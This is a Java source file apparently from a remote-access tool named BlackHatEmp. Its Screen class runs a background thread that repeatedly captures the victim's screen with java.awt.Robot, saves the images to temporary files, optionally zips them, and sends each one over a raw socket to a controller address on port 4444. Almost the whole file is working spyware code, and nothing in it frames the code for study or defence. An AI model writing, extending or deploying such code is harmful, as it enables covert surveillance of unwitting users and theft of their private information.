/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package threading;

import blackhatemp.Command;
import blackhatemp.Telnet;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import javax.imageio.ImageIO;
import tooles.BlackHatZIP;

/**
 *
 * @author abaza
 */
public final class Screen extends Thread {

    Robot robot = null;
    Rectangle rectangle = null;
    Telnet MainClass = null;
    boolean continueLoop = false;
    long Sleep;
    String Today;
    OutputStream OutStrem;
    long Index = 0;
    BlackHatZIP ZipFile = null;

    public Screen(long Sleep, Robot robot, Rectangle rect, Telnet Class) {

        ZipFile = new BlackHatZIP();
        ZipFile.init(1);

        this.robot = robot;
        this.rectangle = rect;
        this.Sleep = Sleep;
        this.MainClass = Class;
        DateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd");
        Calendar cal = Calendar.getInstance();
        Today = dateFormat.format(cal.getTime());
        this.go();
    }

    @Override
    public synchronized void run() {
        while (continueLoop) {
            try {
                BufferedImage image = robot.createScreenCapture(rectangle);
                File temp = File.createTempFile("imtemps", ".tmp");
                OutStrem = new FileOutputStream(temp);
                ImageIO.write(image, "JPEG", OutStrem);
//                Thread.sleep(400);
//
                if (OutStrem != null) {
                    OutStrem.flush();
                } else {
                    end();
                }
                image.flush();
                byte[] bFile = new byte[(int) temp.length()];
                try (FileInputStream fileInputStream = new FileInputStream(temp)) {
                    fileInputStream.read(bFile);

                }
                Send(bFile);
                image.flush();
                OutStrem.flush();
                OutStrem.close();
                image = null;
                Thread.sleep(Sleep - 400);
                temp.delete();
            } catch (IOException | InterruptedException ex) {
                end();
                this.MainClass.Action(Command.STOP_SCREEN_SHUT);
            }
        }

    }

    public void go() {
        if (!this.continueLoop) {
            this.continueLoop = true;
            this.setName("ScreenShot");
            this.start();
        }
    }

    public void end() {
        if (this.continueLoop) {
            this.continueLoop = false;
            this.OutStrem = null;
        }
    }

    private void SendToZip(byte[] data) throws IOException {
        BufferedImage imag = ImageIO.read(new ByteArrayInputStream(data));
        File Image = new File(Telnet.GetName() + "_" + Index++ + ".jpg");
        ImageIO.write(imag, "jpg", Image);
        ZipFile.InsertToZip(Image.getAbsolutePath(), 1);
        Image.delete();
        if (blackhatemp.BlackHatEmp.Debug) {
            System.err.println("Inset Image " + Image.getName() + " to Zip");
        }
    }

    private synchronized void Send(byte[] data) throws IOException {
        if (Command.KEY_ZIP_FLAG_SCREEN_SHUT) {
            SendToZip(data);
        }
        if (Command.KEY_RESEVED_FLAG_SCREEN_SHUT) {
            String host = Telnet.ServerIP;
            Socket socket = new Socket(host, 4444);
            DataOutputStream dOut = new DataOutputStream(socket.getOutputStream());
            dOut.writeInt(data.length); // write length of the message
            dOut.write(data);
            if (blackhatemp.BlackHatEmp.Debug) {
                System.err.println("Send Image Size " + data.length);
            }
        }
    }
}
